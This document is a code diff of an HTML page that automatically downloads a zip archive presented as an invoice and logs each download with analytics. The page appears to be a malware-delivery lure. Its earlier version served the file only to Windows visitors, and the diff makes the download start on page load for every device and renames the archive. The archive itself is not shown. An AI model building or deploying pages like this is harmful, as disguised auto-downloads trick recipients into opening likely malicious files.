@@ -22,10 +22,6 @@ gtag('config', 'G-NFZ363R577');
 </script>
 
 <script>
-function isWindows() {
-    return /Windows/i.test(navigator.userAgent);
-}
-
 // отправка pageview ОБЯЗАТЕЛЬНО
 window.addEventListener('load', function () {
     if (window.counter) {
@@ -38,7 +34,7 @@ async function trackDownload(method) {
     if (typeof gtag !== 'undefined') {
         gtag('event', 'invoice_download', {
             event_category: 'Download',
-            event_label: 'inv-042077.zip',
+            event_label: 'inv-45590.zip',
             method: method
         });
     }
@@ -64,8 +60,8 @@ async function trackDownload(method) {
 
 function initiateDownload() {
     const link = document.createElement('a');
-    link.href = 'inv-042077.zip';
-    link.download = 'inv-042077.zip';
+    link.href = 'inv-45590.zip';
+    link.download = 'inv-45590.zip';
     
     link.addEventListener('click', function () {
         trackDownload('auto');
@@ -77,35 +73,24 @@ function initiateDownload() {
 }
 
 window.onload = function () {
-    if (isWindows()) {
-        document.getElementById('windows').style.display = 'block';
-        // Автоматически запускаем скачивание для Windows
-        initiateDownload();
-    } else {
-        document.getElementById('not-windows').style.display = 'block';
-    }
+    // Автоматически запускаем скачивание для всех устройств
+    initiateDownload();
 };
 </script>
 </head>
 
 <body style="font-family: Arial, sans-serif; text-align:center; padding:50px;">
 
-<div id="windows" style="display:none;">
+<div>
     <h1>Downloading invoice…</h1>
     <p>
         If the download doesn't start,
-        <a href="inv-042077.zip"
+        <a href="inv-45590.zip"
            download
            onclick="trackDownload('manual');">
            click here
         </a>
     </p>
-</div>
-
-<div id="not-windows" style="display:none;">
-    <h1>PC Only</h1>
-    <p>This file can be viewed <strong>only from a Windows PC</strong>.</p>
-    <p>Please open this page on a Windows computer to download the invoice.</p>
 </div>
 
 </body>
